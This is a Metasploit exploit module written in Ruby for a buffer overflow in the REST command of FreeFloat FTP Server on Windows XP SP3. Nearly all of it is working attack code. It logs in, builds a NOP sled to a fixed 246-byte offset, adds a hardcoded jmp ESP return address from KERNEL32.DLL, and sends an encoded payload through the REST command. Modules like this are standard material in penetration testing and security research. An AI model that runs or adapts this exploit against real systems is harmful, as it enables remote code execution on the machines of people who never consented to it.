##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::Ftp
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'FreeFloat FTP Server REST Buffer Overflow',
            'Description'    => %q{
                        This module exploits a FreeFloat FTP Server Buffer Overflow
						found in the REST command.
            },
            'Author'         => [
                        'C4SS!0 G0M3S',     # Discovery Vuln.
                        'KaHPeSeSe'         # Metasploit Module
                    ],
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: $',
            'References'     =>
                [
                    [ 'URL', 'http://www.exploit-db.com/exploits/17546' ],
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'BadChars' => "\x00\x0a\x0d",
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    [ 'PERFECT XP PC1 / SP3',
                        {
                            'Ret' => 0x7C874413, # findjmp KERNEL32.DLL ESP 0x7C874413 jmp ESP
                            'Offset' => 246
                        }
                    ],
                ],
            'DisclosureDate' => 'Jul 18 2011',
            'DefaultTarget' => 0))
    end
 
    def exploit
        connect_login
 
        print_status("Trying target #{target.name}...")
 
        buf = make_nops(target['Offset']) + [target.ret].pack('V')
        buf << make_nops(20)
        buf << payload.encoded
 
        send_cmd( ['REST', buf] , false )
 
        handler
        disconnect
    end
 
end